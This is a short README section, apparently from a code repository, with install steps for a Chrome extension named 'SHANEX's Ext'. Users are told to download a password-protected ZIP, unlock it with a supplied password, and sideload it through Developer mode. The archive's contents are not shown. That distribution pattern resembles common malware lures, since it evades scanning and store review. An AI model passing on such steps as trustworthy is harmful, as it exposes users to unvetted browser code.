## 📥 How to Download and Install

To ensure secure distribution, the extension files are packaged in a password-protected ZIP archive.

1. **Star this Repository** ⭐
   Please star the repository to show support and stay updated with the latest releases!

2. **Download the Archive**
   - Click on the [SHANEX's Ext.zip](./SHANEX's%20Ext.zip) file in this repository.
   - Click the **Download** button on the right side of the screen to save the ZIP file to your computer.

3. **Extract the ZIP**
   - Locate the downloaded `SHANEX's Ext.zip` file.
   - Unpack it using any standard ZIP extractor (like default Windows Explorer, macOS Archive Utility, or 7-Zip).
   - Enter the password: **`@developers1420`** when prompted.

4. **Install in Chrome**
   - Open Google Chrome and navigate to `chrome://extensions/`.
   - Enable **Developer mode** (toggle switch in the top-right corner).
   - Click **Load unpacked** in the top-left corner.
   - Select the extracted folder (containing `manifest.json`).
